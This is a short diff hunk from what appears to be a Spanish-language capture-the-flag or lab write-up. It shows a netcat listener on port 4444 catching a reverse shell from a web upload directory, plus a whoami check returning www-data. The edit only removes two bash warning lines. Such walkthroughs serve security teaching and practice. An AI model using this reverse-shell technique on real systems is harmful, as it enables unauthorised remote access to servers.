@@ -119,8 +119,6 @@ Habiéndonos puesto en escucha antes de ejecutar el comando en la web, ahora deb
 └─$ nc -nlvp 4444 
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 46406
-bash: cannot set terminal process group (25): Inappropriate ioctl for device
-bash: no job control in this shell
 www-data@54d9841b83ec:/var/www/html/uploads$ whoami   
 whoami
 www-data
